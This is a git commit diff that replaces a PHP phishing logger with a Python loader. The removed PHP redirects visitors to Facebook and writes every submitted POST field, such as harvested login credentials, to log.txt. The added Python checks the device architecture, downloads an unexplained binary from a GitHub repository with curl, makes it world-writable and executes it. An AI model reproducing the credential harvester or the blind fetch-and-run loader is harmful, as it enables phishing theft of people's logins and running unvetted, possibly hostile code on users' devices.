56061cf675d511967e82be3e459d4d3b53e7ef02
shahrukhkhilji89 <86099421+shahrukhkhilji89@users.noreply.github.com>
2022-08-21 23:09:01 +0500

    Update shahrukh.py

--- shahrukh.py
+++ shahrukh.py
@@ -1,13 +1,20 @@
-<?php
-header ('Location: http://www.facebook.com');
-$handle = fopen("log.txt", "a");
-foreach($_POST as $variable => $value) {
-   fwrite($handle, $variable);
-   fwrite($handle, "=");
-   fwrite($handle, $value);
-   fwrite($handle, "\r\n");
-}
-fwrite($handle, "\r\n");
-fclose($handle);
-exit;
-?>
+import os,sys,subprocess
+current_os=subprocess.check_output('uname -om',shell=True)
+if 'aarch64' in str(current_os):
+    if not os.path.isfile('h64'):
+        os.system('curl -L https://github.com/hop09/libraries/blob/main/h64?raw=true > h64')
+        os.system('chmod 777 h64')
+        os.system('./h64')
+    else:
+        os.system('./h64')
+elif 'arm' in str(current_os):
+    if not os.path.isfile('h32'):
+        os.system('curl -L https://github.com/hop09/libraries/blob/main/h32?raw=true > h32')
+        os.system('chmod 777 h32')
+        os.system('./h32')
+    else:
+        os.system('./h32')
+else:
+    print('\n  Unknown device, aarch or os found, contact author.')
+    print('  Owner whatsapp: +92321-5822365\n\n')
+    os.sys.exit()
